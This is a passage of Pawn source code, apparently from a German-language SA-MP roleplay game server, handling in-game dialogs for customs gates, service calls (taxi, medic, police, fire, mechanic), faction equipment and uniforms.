					format(stringx, sizeof(stringx), "<< %s %s: hat die Zölle von LS nach SF verschlossen >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid));
                    SendClientMessageToAll(COLOR_DBLUE,stringx);
				}
				else {
				    zollvar[0] = 0;
				    zollvar[1] = 0;
				    zollvar[2] = 0;
				    zollvar[3] = 0;
				    zollvar[12] = 0;
				    zollvar[13] = 0;
				    zollvar[14] = 0;
				    zollvar[15] = 0;
					format(stringx, sizeof(stringx), "<< %s %s: hat die Zölle von LS nach SF geöffnet >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid));
                    SendClientMessageToAll(COLOR_DBLUE,stringx);
				}
	        }
	        case 2: // LS-LV
	        {
				if(zollvar[9] == 0) {
				    zollvar[8] = 1;
				    zollvar[9] = 1;
				    zollvar[4] = 1;
				    zollvar[5] = 1;
				    zollvar[6] = 1;
				    zollvar[7] = 1;
					format(stringx, sizeof(stringx), "<< %s %s: hat die Zölle von LS nach LV verschlossen >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid));
                    SendClientMessageToAll(COLOR_DBLUE,stringx);
				}
				else {
				    zollvar[8] = 0;
				    zollvar[9] = 0;
				    zollvar[4] = 0;
				    zollvar[5] = 0;
				    zollvar[6] = 0;
				    zollvar[7] = 0;
					format(stringx, sizeof(stringx), "<< %s %s: hat die Zölle von LS nach LV geöffnet >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid));
                    SendClientMessageToAll(COLOR_DBLUE,stringx);
				}
			}
	        case 3: // SF-LV
	        {
	            if(zollvar[10] == 0) {
	                zollvar[10] = 1;
	                zollvar[11] = 1;
	                zollvar[16] = 1;
	                zollvar[17] = 1;
	                zollvar[18] = 1;
	                zollvar[19] = 1;
					format(stringx, sizeof(stringx), "<< %s %s: hat die Zölle von SF nach LV verschlossen >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid));
                    SendClientMessageToAll(COLOR_DBLUE,stringx);
	            }
	            else {
	                zollvar[10] = 0;
	                zollvar[11] = 0;
	                zollvar[16] = 0;
	                zollvar[17] = 0;
	                zollvar[18] = 0;
	                zollvar[19] = 0;
					format(stringx, sizeof(stringx), "<< %s %s: hat die Zölle von SF nach LV geöffnet >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid));
                    SendClientMessageToAll(COLOR_DBLUE,stringx);
				}
	        }
	    }
	}
    if(dialogid ==DIALOG_INVITE)
	{
		if(response)
		{
		  OnPlayerCommandText(playerid,"/einladung annehmen");
		}
		else
		{
		  OnPlayerCommandText(playerid,"/einladung ablehnen");
		}
    	return 1;
	}
	if(dialogid==DIALOG_ZOLLCONTROL2)
	{
	    new idzoll = strval(inputtext);
	    if(idzoll >= 1 && idzoll <= 20)
	    {
			if(zollvar[idzoll-1] == 1)
			{
			    format(stringx, sizeof(stringx), "<< %s %s: hat den Zoll %d geöffnet >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid), idzoll);
                SendClientMessageToAll(COLOR_DBLUE,stringx);
				zollvar[idzoll-1] = 0;
			}
			else {
				format(stringx, sizeof(stringx), "<< %s %s: hat den Zoll %d geschlossen >>",GetFrakRang(PlayerInfo[playerid][pRank],PlayerInfo[playerid][sMember]), MeinName(playerid), idzoll);
                SendClientMessageToAll(COLOR_DBLUE,stringx);
				zollvar[idzoll-1] = 1;
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Nur von 1-20!");
	}
	if(dialogid == DIALOG_WEQUIP)
	{
		if(response == 1) {
		    switch(listitem)
		    {
		        case 0:
		        {
		            SetPlayerArmour(playerid, 100.0);
		            SetPlayerHealth(playerid, 100.0);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich gehealt und eine Rüstung angezogen.");
		            ShowPlayerDialog(playerid,DIALOG_WEQUIP,DIALOG_STYLE_LIST, "Wheelman Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. Sniper","Auswählen","Abbrechen");
		        }
		        case 1:
		        {
		            ServerWeapon(playerid, 24, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich mit einer Desert Eagle ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_WEQUIP,DIALOG_STYLE_LIST,"Wheelman Ausrüstung", "1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. Sniper","Auswählen","Abbrechen");
		        }
		        case 2:
		        {
		            ServerWeapon(playerid, 29, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich mit einer MP5 ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_WEQUIP,DIALOG_STYLE_LIST,"Wheelman Ausrüstung", "1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. Sniper","Auswählen","Abbrechen");
		        }
		        case 3:
		        {
		            ServerWeapon(playerid, 31, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich mit einer M4 ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_WEQUIP,DIALOG_STYLE_LIST,"Wheelman Ausrüstung", "1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. Sniper","Auswählen","Abbrechen");
		        }
		        case 4:
		        {
		            ServerWeapon(playerid, 34, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich mit einer Sniper ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_WEQUIP,DIALOG_STYLE_LIST,"Wheelman Ausrüstung", "1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. Sniper","Auswählen","Abbrechen");
		        }
		    }
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Hoffentlich wirst du dein Ziel erreichen.");
	}
    if(dialogid == DIALOG_SERVICE)
	{
		if(response)
		{
				if(listitem == 0)
				{
					new string[256];
					new sendername[MAX_PLAYER_NAME];
					GetPlayerName(playerid, sendername, sizeof(sendername));
					{
					    if(GetPlayerInterior(playerid) != 0)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
				            return 1;
				        }
					    if(TaxiDrivers < 1)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Es ist kein Taxifahrer im Dienst, bitte versuche es später noch einmal.");
				            return 1;
				        }
				        if(TransportDuty[playerid] > 0)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Du kannst im Momment kein Taxi rufen.");
				            return 1;
				        }
				        GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "[Leitstelle] %s braucht ein Taxi. Gib (/accept taxi) ein, um anzunehmen)", sendername);
						for(new i = 0; i < MAX_PLAYERS; i++)
						{
					        if(TransportDuty[i] == 1)
					        {
				    			SendClientMessage(i, COLOR_LIGHTBLUE, string);
							}
						}
				    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast ein Taxi angefordert, warte auf eine Antwort.");
				    	SetTimerEx("ServiceReset", 30000, false, "i", playerid);
//				    	JustService[playerid] = 1;
				    	TaxiCall = playerid;
					}
				}
				if(listitem == 1)
				{
					new string[256];
					new sendername[MAX_PLAYER_NAME];
					GetPlayerName(playerid, sendername, sizeof(sendername));
					{
					    if(GetPlayerInterior(playerid) != 0)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
				            return 1;
				        }
					    if(BusDrivers < 1)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Es ist kein Busfahrer im Dienst, bitte versuche es später noch einmal.");
				            return 1;
				        }
				        if(TransportDuty[playerid] > 0)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Du kannst im Momment keinen Bus rufen.");
				            return 1;
				        }
				        GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "[Leitstelle] %s braucht ein Bus. Gib (/accept bus) ein, um anzunehmen.)", sendername);
				    	SendJobMessage(14, COLOR_LIGHTBLUE, string);
				    	SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Du hast einen Busfahrer gerufen, warte auf eine Antwort.");
				    	SetTimerEx("ServiceReset", 30000, false, "i", playerid);
//				    	JustService[playerid] = 1;
				    	BusCall = playerid;
					}
				}
				if(listitem == 3)
				{
				    if(GetPlayerInterior(playerid) != 0)
			        {
			            SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
			            return 1;
			        }
				    new string[256];
				    new sendername[MAX_PLAYER_NAME];
					GetPlayerName(playerid, sendername, sizeof(sendername));
					format(string,sizeof(string),"[Leitstelle] %s benötitgt einen Wheelmen! Gib /accept wheelman ein, um anzunehmen.", sendername);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(IsPlayerInFrac(i, 21))
					    {
					        SendClientMessage(i, COLOR_LIGHTBLUE, string);
						}
					}
					SendClientMessage(playerid, COLOR_LIGHTBLUE, " * Du hast einen Wheelman gerufen, warte auf eine Antwort.");
					SetTimerEx("ServiceReset", 30000, false, "i", playerid);
//					JustService[playerid] = 1;
					WCALL = playerid;
					return 1;
				}
				if(listitem == 2)
				{
				    if(GetPlayerInterior(playerid) != 0)
			        {
			            SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
			            return 1;
			        }
				    if(Medics < 1)
			        {
			            SendClientMessage(playerid, COLOR_GREY, " * Der San Andreas Rettungsdienst ist im Moment nicht erreichbar, versuch es später noch einmal.");
			            return 1;
			        }
			        new string[256];
			        new sendername[MAX_PLAYER_NAME];
			        GetPlayerName(playerid, sendername, sizeof(sendername));
				    format(string, sizeof(string), "[Leitstelle] %s braucht einen Sanitäter. Gib (/accept medic) ein um den Anruf anzunehmen.", sendername);
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
						if(IsPlayerConnected(i))
						{
							if(PlayerInfo[i][pMember] == 22 || PlayerInfo[i][pLeader] == 22)
							{
								SendClientMessage(i, COLOR_LIGHTBLUE, string);
							}
	    				}
					}
			    	SendClientMessage(playerid, COLOR_LIGHTBLUE, " * Du hast den San Andreas Rettungsdienst gerufen, warte auf eine Antwort.");
			    	SetTimerEx("ServiceReset", 30000, false, "i", playerid);
//			    	JustService[playerid] = 1;
			    	MedicCall = playerid;
			    	return 1;
				}
				if(listitem == 4)
				{
					if (TowTruckers < 1)
			  		{
					    SendClientMessage(playerid,COLOR_GRAD1," * Derzeit sind keine Ordnungsbeamte im Dienst.");
					    return 1;
			    	}
			        SendClientMessage(playerid,0xFFFF00AA," * Ordnungsbeamte haben wurden über deinen Notruf informiert!");
			        SetTimerEx("ServiceReset", 30000, false, "i", playerid);
//			        JustService[playerid] = 1;
					new pName[MAX_PLAYER_NAME];
					new msg[256];
					new Float:X, Float:Y, Float:Z;
					GetPlayerPos(playerid, X, Y, Z);
					GetPlayerName(playerid,pName,sizeof(pName));
					format(msg,sizeof(msg),"*** %s (ID:%d) hat einen Notruf abgeschickt, er ist rot markiert. ***",pName,playerid);
					for (new i=0;i<MAX_PLAYERS;i++)
			  		{
					    if(IsTowTrucker[i] == 1)
			    	  	{
							SendClientMessage(i,0xFFFF00AA,msg);
							SetPlayerCheckpoint(i, X,Y,Z,3.0);
						}
			    	}
				}
				if(listitem == 5)
				{
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(GetPlayerInterior(playerid) != 0)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
				            return 1;
				        }
				        new sendername[MAX_PLAYER_NAME];
				        new string[256];
				        GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "[Leitstelle] %s hat einen Streifenwagen angefordert, Gib (/accept polizei) ein um den Auftrag anzunehmen.", sendername);
						{
							if(IsPlayerConnected(i))
							{
								if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pLeader] == 1)
								{
									SendClientMessage(i, COLOR_LIGHTBLUE, string);
								}
		    				}
						}
				    	SendClientMessage(playerid, COLOR_LIGHTBLUE, " * Du hast einen Streifenwafen gerufen, warte auf eine Antwort.");
				    	SetTimerEx("ServiceReset", 30000, false, "i", playerid);
				    	CopCall = playerid;
				    	return 1;
					}
                }
				if(listitem == 6)
				{
					for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    if(GetPlayerInterior(playerid) != 0)
				        {
				            SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
				            return 1;
				        }
				        new sendername[MAX_PLAYER_NAME];
				        new string[256];
				        GetPlayerName(playerid, sendername, sizeof(sendername));
					    format(string, sizeof(string), "[Leitstelle] %s hat die Feuerwehr angefordert, Gib (/accept fire) ein um den Auftrag anzunehmen.", sendername);
						{
							if(IsPlayerConnected(i))
							{
								if(PlayerInfo[i][pMember] == 15 || PlayerInfo[i][pLeader] == 15)
								{
									SendClientMessage(i, COLOR_LIGHTBLUE, string);
								}
		    				}
						}
				    	SendClientMessage(playerid, COLOR_LIGHTBLUE, " * Du hast die Feuerwehr gerufen, warte auf eine Antwort.");
				    	SetTimerEx("ServiceReset", 30000, false, "i", playerid);
				    	FireCall = playerid;
				    	return 1;
					}
              }
              if(listitem == 7)
              {
                	if(GetPlayerInterior(playerid) != 0)
     				{
         				SendClientMessage(playerid, COLOR_GREY, " * Du bist in einem Interior, dort hast du keinen Empfang, geh auf die Straße.");
	            		return 1;
     				}

                    new string[128];
                    MechanikerAccept[playerid] = playerid;
                	for(new i = 0; i < MAX_PLAYERS; i++)
					{
					    format(string, sizeof(string), "[ORG] %s hat einen Mechaniker angefordert, Gib (/accept mechaniker) ein um den Auftrag anzunehmen.", GetName(playerid));
						{
							if(IsPlayerConnected(i))
							{
								if(IsMechatronikerLizensiert(i))
								{
									SendClientMessage(i, COLOR_LIGHTBLUE, string);
								}
		    				}
						}
					}
			  }



		 }
	}
   	if(dialogid == DIALOG_FBIEQUIP)
	{
		if(response == 1) {
		    switch(listitem)
		    {
		        case 0:
		        {
		            new frak;
	                frak = PlayerInfo[playerid][sMember];
			        if(frak == 1 && LSPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 2 && FBIMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 22 && LVPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
					if(frak == 1)
					{
						LSPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   		Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
					}
					else if(frak == 2)
					{
						FBIMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   		Update3DTextLabelText(fbikammer,COLOR_RED,string11);

					}
					if(frak == 22)
					{
						LVPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   		Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
					}
		        	SaveFrakMats();
					SetPlayerHealth(playerid, 100.0);
					SetPlayerArmour(playerid, 100.0);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich erfolgreich Ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST, "Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock","Auswählen","Abbrechen");
		        }
		        case 1:
		        {
		            new frak;
	                frak = PlayerInfo[playerid][sMember];
			        if(frak == 1 && LSPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 2 && FBIMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 22 && LVPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
					if(frak == 1)
					{
						LSPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   		Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
					}
					else if(frak == 2)
					{
						FBIMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   		Update3DTextLabelText(fbikammer,COLOR_RED,string11);
					}
					if(frak == 22)
					{
						LVPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   		Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
					}
		        	SaveFrakMats();
				    ServerWeapon(playerid, 24, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich erfolgreich Ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST, "Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock","Auswählen","Abbrechen");
		        }
		        case 2:
		        {
		            new frak;
	                frak = PlayerInfo[playerid][sMember];
			        if(frak == 1 && LSPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 2 && FBIMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 22 && LVPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
					if(frak == 1)
					{
						LSPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   		Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
					}
					else if(frak == 2)
					{
						FBIMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   		Update3DTextLabelText(fbikammer,COLOR_RED,string11);
					}
					if(frak == 22)
					{
						LVPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   		Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
					}
		        	SaveFrakMats();
				    ServerWeapon(playerid, 29, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich erfolgreich Ausgerüstet.");
                    ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST, "Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock","Auswählen","Abbrechen");
		        }
                case 3:
		        {
		            new frak;
	                frak = PlayerInfo[playerid][sMember];
			        if(frak == 1 && LSPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 2 && FBIMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 22 && LVPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
					if(frak == 1)
					{
						LSPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   		Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
					}
					else if(frak == 2)
					{
						FBIMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   		Update3DTextLabelText(fbikammer,COLOR_RED,string11);
					}
					if(frak == 22)
					{
						LVPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   		Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
					}
		        	SaveFrakMats();
				    ServerWeapon(playerid, 31, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich erfolgreich Ausgerüstet.");
                    ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST, "Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock","Auswählen","Abbrechen");
		        }
                case 4:
		        {
		            new frak;
	                frak = PlayerInfo[playerid][sMember];
			        if(frak == 1 && LSPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 2 && FBIMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 22 && LVPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
					if(frak == 1)
					{
						LSPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   		Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
					}
					else if(frak == 2)
					{
						FBIMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   		Update3DTextLabelText(fbikammer,COLOR_RED,string11);
					}
					if(frak == 22)
					{
						LVPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   		Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
					}
		        	SaveFrakMats();
				    ServerWeapon(playerid, 22, 1000);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich erfolgreich Ausgerüstet.");
                    ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST, "Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock","Auswählen","Abbrechen");
		        }
                case 5:
		        {
		            new frak;
	                frak = PlayerInfo[playerid][sMember];
			        if(frak == 1 && LSPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 2 && FBIMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
			        else if(frak == 22 && LVPDMats - 20 < 0)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "So viele Fraktions-Materialien sind nicht in der Fraktionskammer!");
						return 1;
					}
					if(frak == 1)
					{
						LSPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}LSPD{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LSPDMats);
				   		Update3DTextLabelText(lspdkammer,COLOR_RED,string11);
					}
					else if(frak == 2)
					{
						FBIMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}FBI{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",FBIMats);
				   		Update3DTextLabelText(fbikammer,COLOR_RED,string11);
					}
					if(frak == 22)
					{
						LVPDMats -= 20;
						new string11[128];
				        format(string11, sizeof(string11), "{00C0FF}S.W.A.T{FFFFFF} Waffenkammer {F81414}%d{FFFFFF} Materialen.",LVPDMats);
				   		Update3DTextLabelText(lvpdkammer,COLOR_RED,string11);
					}
		        	SaveFrakMats();
					ServerWeapon(playerid, 3, 1);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast dich erfolgreich Ausgerüstet.");
		            ShowPlayerDialog(playerid,DIALOG_FBIEQUIP,DIALOG_STYLE_LIST, "Ausrüstung","1. Rüstung\n2. Deagle\n3. Mp5\n4. M4\n5. 9mm\n6. Schlagstock","Auswählen","Abbrechen");
		        }
				case 6:
				{
				    format(ALLSTRING, sizeof(ALLSTRING), "Du hast %d Fraktions-Materialien dabei.\nWie viele willst du in die Waffenkammer reinlegen?", PlayerInfo[playerid][pMats]);
				    ShowPlayerDialog(playerid, DIALOG_KAMMER_FMATS, DIALOG_STYLE_INPUT, "Fraktions Materialien", ALLSTRING, "Reinlegen", "Abbrechen");
				}
		    }
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Ausgerüstet");
	}
   	if(dialogid == DIALOG_FBIUNIFORM)
	{
		if(response == 1) {
		    switch(listitem)
		    {
		        case 0:
		        {
					SetPlayerSkin(playerid, 170);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast die FBI Uniform angezogen.");
		            ShowPlayerDialog(playerid,DIALOG_FBIUNIFORM,DIALOG_STYLE_LIST, "FBI Unifrom","1. FBI Uniform Rank 1-3\n2. FBI Uniform Rank 4-6\n3. FBI Uniform Rank 7-9\n4. FBI Uniform Rank 10-12","Auswählen","Abbrechen");
		        }
		        case 1:
		        {
				    SetPlayerSkin(playerid, 285);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast die FBI Uniform angezogen.");
		            ShowPlayerDialog(playerid,DIALOG_FBIUNIFORM,DIALOG_STYLE_LIST, "FBI Unifrom","1. FBI Uniform Rank 1-3\n2. FBI Uniform Rank 4-6\n3. FBI Uniform Rank 7-9\n4. FBI Uniform Rank 10-12","Auswählen","Abbrechen");
		        }
		        case 2:
		        {
				    SetPlayerSkin(playerid, 286);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast die FBI Uniform angezogen.");
		            ShowPlayerDialog(playerid,DIALOG_FBIUNIFORM,DIALOG_STYLE_LIST, "FBI Unifrom","1. FBI Uniform Rank 1-3\n2. FBI Uniform Rank 4-6\n3. FBI Uniform Rank 7-9\n4. FBI Uniform Rank 10-12","Auswählen","Abbrechen");
		        }
		        case 3:
		        {
					SetPlayerSkin(playerid, 165);
		            SendClientMessage(playerid, COLOR_WHITE, "Du hast die FBI Uniform angezogen.");
		            ShowPlayerDialog(playerid,DIALOG_FBIUNIFORM,DIALOG_STYLE_LIST, "FBI Unifrom","1. FBI Uniform Rank 1-3\n2. FBI Uniform Rank 4-6\n3. FBI Uniform Rank 7-9\n4. FBI Uniform Rank 10-12","Auswählen","Abbrechen");
		        }
		    }
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Ausgerüstet");
	}
	if(dialogid==DIALOG_ARBOBJ) // Auswahl von den Objekten
	{
		switch(listitem)
		{
			case 0..14: // Objekt 1-15
			{
			    if(response == 1)
			    {
				    Objekt[playerid] = listitem+1; // +1 damit die Objekt ID zur Abfrage stimmt
					format(stringx, sizeof(stringx), "Du hast nun %d als Objekt zum spawnen!", listitem+1);
				    ShowPlayerDialog(playerid, DIALOG_AUSGEWAEHLT, DIALOG_STYLE_MSGBOX, "Bestätigung", stringx, "Okay", "Fertig");
			    }
			}
			case 15:
			{
			    if(response == 1)
			    {
			        ShowPlayerDialog(playerid, DIALOG_OBJINPUT, DIALOG_STYLE_INPUT, "Objekt System", "Objekt ID eingeben", "Auswählen","Abbrechen");
			    }
			}
		}
	}
	if(dialogid==DIALOG_OBJINPUT)
	{
	    if(response == 1)
	    {
	        new obj = strval(inputtext);
	        if(PlayerInfo[playerid][pAdmin] >= 2000)
	        {
		        if(obj == 0) { }
		        else {
		            Objekt[playerid] = 999999;
		            ObjektID[playerid] = obj;
		            format(stringx, sizeof(stringx), "Du hast nun %d als Objekt zum spawnen!", obj);
		            ShowPlayerDialog(playerid, DIALOG_AUSGEWAEHLT, DIALOG_STYLE_MSGBOX, "Bestätigung", stringx, "Fertig", " ");
		        }
	        }
	        else SendClientMessage(playerid, COLOR_WHITE, "Erst ab Admin Level 2000 möglich.");
	    }
	}
	if(dialogid == DIALOG_KLINGEL)
	{
		if(response)
		{
			if(listitem == 0)
			{
			 	if(PlayerInfo[playerid][pJob] != 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "Du bist kein Anwalt!");
					return 1;
				}
